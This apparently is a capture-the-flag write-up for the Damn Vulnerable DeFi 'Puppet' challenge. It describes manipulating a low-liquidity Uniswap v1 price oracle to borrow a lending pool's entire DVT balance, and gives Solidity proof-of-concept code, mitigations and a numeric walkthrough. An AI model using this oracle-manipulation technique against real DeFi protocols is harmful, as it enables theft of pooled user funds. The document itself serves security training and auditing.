## Oracle manipulation allows an attacker to borrow all the DVT from the pool with a relatively small amount of ETH.

an attacker can borrow all the DVT from a pool with a relatively small amount of ETH.

The price of ETH relative to DVT is sourced from a Uniswap v1 pool. This specific pool has very low liquidity, making it vulnerable to price manipulation. An attacker can execute a single, large swap to artificially inflate the price of DVT, then use this manipulated price to borrow a disproportionately large amount of DVT from the lending pool.

### recomended mitigations
- Use a Decentralized Oracle Network like Chainlink.
- Implement a Time-Weighted Average Price (TWAP) Oracle (like UniswapV2), instead of relying on the spot price from a single block.
- 

### PoC
Create a contract to interact with Uniswap pool to make a swap:
```solidity
contract Interacter {
    IUniswapV1Exchange uniswapV1Exchange;
    DamnValuableToken token;
    constructor(IUniswapV1Exchange _uni, DamnValuableToken _token) {
        uniswapV1Exchange = _uni;
        token = _token;
    }

    // @dev this function swaps all the DVT balance of this contract for ETH
    function swapDVTForETH() public {
        token.approve(address(uniswapV1Exchange), token.balanceOf(address(this)));
        uniswapV1Exchange.tokenToEthSwapInput(token.balanceOf(address(this)), 1, block.timestamp + 1 days ); // uint256 tokens_sold, uint256 min_eth, uint256 deadline
    }
    
    // @dev needed to receive the eth from the swap
    receive() external payable {}
}
```

Perform the swap and proceed to borrow with the inflated ETH price to take all the funds:
```solidity
    function test_puppet() public 
    checkSolvedByPlayer 
    {
        // deploy Interacter and transfer player's DVT to make the swap
        Interacter interacter = new Interacter(uniswapV1Exchange, token);
        token.transfer(address(interacter), token.balanceOf(player)); 
        // swap tokens to manipulate the prices 
        interacter.swapDVTForETH();
        // recover funds 
        lendingPool.borrow{ value:player.balance }(token.balanceOf(address(lendingPool)), recovery);
    }
```

### The Attack in Detail (for this specific case):

**Initial State:**
- Lending Pool: 100,000 DVT.
- Uniswap Pool: 10 DVT and 10 ETH.
- player's wallet: 1,000 DVT and 25 ETH.

**Manipulation (Swap):**
- The player swaps 1,000 DVT for ETH in the Uniswap pool.
- New Uniswap Pool Balances: 1,010 DVT and approximately 0.0993 ETH.
- New Price: The manipulated price is now 1 DVT = 0.00009832 ETH (Before the manipulation, the price was 1 ETH = 1 DVT).

The lending pool's collateralization factor requires a user to deposit twice the worth of the borrowed DVT in ETH.
For example, to borrow 1 DVT, a user might be required to deposit 2 ETH.

Initially, To borrow the entire 100,000 DVT from the pool, a user would need to deposit 200,000 ETH. This is practically unfeasible.

Post-Manipulation, an attacker can now borrow all 100,000 DVT by depositing less than 20 ETH.